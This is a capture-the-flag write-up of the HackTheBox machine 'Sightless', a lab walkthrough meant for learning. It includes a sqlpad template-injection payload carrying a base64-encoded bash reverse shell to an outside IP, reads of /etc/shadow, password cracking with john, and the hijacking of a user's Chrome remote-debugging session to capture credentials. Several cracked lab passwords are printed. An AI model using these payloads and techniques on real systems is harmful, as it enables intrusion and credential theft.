This box is an easy linux one, like many other ones on HackTheBox. However I think the priviliege escalation part was really interesting so I decided to share a write up for this box. As this is an easy linux one, it wont be too long.

Details :
It took my team and I ~2 hours to root it.

## Recon 
I'll start by running the default nmap scan : 
```terminal
┌──(samsam㉿pika-pika)-[~/Downloads]

Nothing to unusual, I'll scan UDP if I get stuck, but we won't need it here.

## FTP
Trying to connect to ftp anonymously fails, but actually not because of the credentials :
```terminal
┌──(samsam㉿pika-pika)-[~/Downloads]            
└─$ ftp 10.129.190.84

ftp> 
```
If we google this we realize we need an ftp client that supports SSL encryption. `lftp` does just that : 
```terminal
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ lftp -u a,a ftp://sightless.htb -e "set ssl:verify-certificate no"
lftp a@sightless.htb:~> ls
ls: Login failed: 530 Login incorrect.
lftp a@sightless.htb:~>
```
We'll need to come back whenever we have credentials for this service.

## Web
Port 80 is open, and as nmap said is delivering web content. Accessing it returns a redirect to `sightless.htb`. After adding it to my `/etc/hosts` file, let's access it with firefox :
![[web.png]]
It's a really simple web page, none of the buttons work. I could try to bruteforce directories but this is not the way here. There's a link at the bottom mentionning a subdomain, `sqlpad.sightless.htb`.

## sqlpad.sightless.htb
Going to sqlpad.sightless.htb gives us access to a simple sqlpad interface : 
![[sqlpad.png]]
This is the right time to keep in mind that this is an easy box. Where on an insane/hard, we would probably have to understand a lot about how sqlpad works, this is not the case here. In fact we are on google search away from getting a shell. The website displays `sqlpad version 6.10.0`. Googling sqlpad exploit leads to [this post](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb), which describes a vulnerability affecting all sqlpad instance for versions prior to 6.10.1. The payload is the following :
```python
{{ process.mainModule.require('child_process').exec('id>/tmp/pwn') }}
```
To get a shell from it, I'll use the standard bash reverse shell, and base64 encode it to avoid bad characters :
`bash -i >& /dev/tcp/10.10.14.201/2222 0>&1`. My final payload is :
```python
{{ process.mainModule.require('child_process').exec('echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDEvMjIyMiAwPiYx |base64 -d|bash') }}
```
Now I follow the blog post describing the exploit, I create a new connection using the MySQL driver, and put my payload as the database :
![[editconnectionsqlpad.png]]
When I click on save, I do get a shell on my nc listener :
```terminal
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ nc -lnvp 2222                   
Listening on 0.0.0.0 2222
Connection received on 10.129.98.24 42392
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad#
```
As you can see we got a root shell from a container (which we can guest from the random hostname c184118df0a6). 

## User
Always enumerate a bit manually before running heavy tools like linpeas ! In this case another user is present in the container :
```terminal
root@c184118df0a6:/# ls /home
michael  node
root@c184118df0a6:/# ls /home/michael
root@c184118df0a6:/#
```
Well two users, but I assume node is created for sqlpad. Since we are root we can access the hash of michael, in `/etc/shadow` !
```terminal
root@c184118df0a6:/# grep michael /etc/shadow
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```
There are many many tutorials on [how to brute force linux passwords](https://erev0s.com/blog/cracking-etcshadow-john/), and you can even ask chatgpt. Now I'll copy michael's shadow line in a file called `s`, and his passwd line in a file called `p`, then :
```terminal
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt

michael:insaneclownposse:1001:1001::/home/michael:/bin/bash

1 password hash cracked, 0 left
```
Since I've already cracked it I had to pass it `--show`, you wont have to do this if it's your first time cracking it.

We can try to connect to the host with these credentials, and it works !
```terminal
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ sshpass -p insaneclownposse ssh michael@sightless.htb

michael@sightless:~$ cat user.txt 
b6b1f528799b649e259c3186d2932f4f
```
And boom `user.txt` :)

## John
We are not alone on the box, there is also john in `/home`. We can try to enumerate his processes : 
```terminal
michael@sightless:~$ ls /home
john  michael                                                                                                                                
michael@sightless:~$ ps -u john -o cmd >out && cat out

```
As you can see john is running google-chrome with remote debugging enabled ! This is great because it allows us to interact with his session and see what he is doing. `--remote-debugging-port=0` means that chrome will use a random port, so first we need to find out which port is used. I'll list all open ports, and as explained in [this post](https://stackoverflow.com/questions/52783655/use-curl-with-chrome-remote-debugging), if I curl `json` it should return me output.

Ports 46013 and 37871 returned some strange stuff, however 38983 returned the expected json ! We can interact with this chrome session by many different ways, one of which is the chrome developper tools. To find out what I could do with this remote debugging chrome browser that john runs, I used a lot of google and found [this tutorial](https://developer.chrome.com/docs/devtools/remote-debugging/local-server) I can actually have access to his browser in real time ! A lot of steps are incoming, so don't worry if it's not quite clear I'll sum it up at the end.
I'll install chrome on my machine first. Then, I need to be able to access the port 37871, which for now is only accessible from the machine sightless.htb. To get access to it, I'll use ssh to forward the port :
`ssh -L 7070:127.0.0.1:38983 michael@sightless.htb`
Now, the port 38983 of the box, listening only on 127.0.0.1, is accessible through the port 7070 of my machine ;) I'll follow the previously linked tutorial and add a new target in chrome://inspect/#devices :
![[chrom_add_config.png]]
Then, a new target appears, meaning that it worked :
![[connect_chrome.png]]
When clicking on inspect, I get a live view of john's browser !! ![[john_login.gif]]
He is connecting to a froxlor instance, typing his username and password, then logs out after a few seconds. I absolutely love it, I've never seen something like that in a ctf. 
So going back to exploitation, since he is typing his password we can actually intercept it, in the inspect pane there is a network tab. I'll log the login request, and stop the recording to check what was sent :
![[intercept.gif]]
And we have the admin password,`ForlorfroxAdmin` for the webapp Froxlor ! 

To sum up what we have done :
We found out that john is running a remotely debuggable chrome instance. Of course we want to debug it. We first found out which port it was debuggable on ( 38983 ). Then we realized this port is only accessible locally. So I forwarded it to my machine using ssh. Then, using chrome, went into the developper tools to add a remote instance, and saw what john was doing. We then captured his login requests and got his credentials. 

## FTP ( again ?! )
John was accessing admin.sightless.htb:8080, which matches what we saw earlier when we checked out which ports were open. Now I can forward port 8080 to my machine, using the same steps we did earlier : 
`ssh -L 7070:127.0.0.1:8080 michael@sightless.htb`
Now if I open firefox and type in 127.0.0.1:7070 I'll have access to the froxlor instance running on port 8080 of sightless.htb. I now have the credentials and can log in the webapp. 
After digging around for a bit, in `Resources -> Domains` theres a new domain, `web1.sightless.htb`. Interestingly, clicking on the web1 username opens the admin pannel of that customer. The FTP tab on the left allows me to reset the ftp password !
![[ftpreset.png]]
I'll just copy paste the password suggestion, hit save, and try to connect to the ftp server :
```terminal

5292 bytes transferred
```
It works ! we can download the Database.kdb backup file. 
I can try to open it using a keepass file viewer, like keepassxc, but it requires a password. I'll try to brute force it using johntheripper :
```terminal

The password is bulldogs. This is getting quite long for an easy box, but hey we are almost done !
I'll import it in `keepassxc`, making sure to use import file, because this is a .kdb file meaning it's using KeePass 1.X :
![[keepass_import.png]]
The database only has one entry, Username : root Password : q6gnLTB74L132TMdFCpK However it doesn't work on ssh nor when I `su root`. And `id_rsa` file is attached, and I can save it !
![[keepass_attachment.png]]

If we look closely at the id_rsa file, using xxd :
```terminal
┌──(samsam㉿pika-pika)-[~/htb/sightless]

```
It's highlighted in my terminal, here it's not, but the bytes `0d 0a` (the second and third bytes , right after the 3d) here are relevant because they are the newline characters in Windows file formats. However in linux it's not the case, we only use `0a`, which is `\n`. We need to strip all `0d` bytes from this file. This can be done using the tool `dos2unix`. We also notice that the id_rsa file is missing an `\n` in the end, which we'll need to add to fix the format.
